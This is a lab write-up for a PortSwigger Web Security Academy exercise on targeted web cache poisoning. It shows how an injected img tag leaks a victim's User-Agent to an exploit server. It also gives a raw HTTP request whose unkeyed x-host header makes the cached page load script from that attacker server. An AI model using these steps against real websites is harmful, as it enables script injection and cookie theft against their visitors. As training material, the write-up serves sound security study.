# [Targeted web cache poisoning using an unknown header] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-27
 
---
 
## Vulnerability / core concept
Web Cache Poisoning

---


## Payload / key command
This web application allows us to comment HTML. We need to keep this in mind because it will come in handy later on.

When we load the `/post?postId=` endpoint, we can see that web application uses cache to download the page. Also, we can notice that website returns `Response` with `Vary: User-Agent` header, meaning that `User-Agent` is one of the keys for cache. So, to exploit web cache poisoning, we need to know the `User-Agent` of the victim.

First, we need to get User-Agent of the victim. We can do this by exploiting HTML in comment section. We can send `<img src="our-exploit-server">` so when victim downloads the page, we get their `User-Agent` in our exploit server.

After that, we can send the following request to poison the web cache:
```bash
GET /post?postId=5 HTTP/1.1
Host: 0a840080038a16a9809f120b00d0005c.h1-web-security-academy.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
...

x-host: exploit-0a3800a6037d163980d8119a01e9005e.exploit-server.net
```
Using `Param Finder` we found that web site uses `x-host` header. Using this header, we can make web app download its `/resources/js/tracking.js` from our malicious server that will execute `alert(document.cookie` in victim's browser.

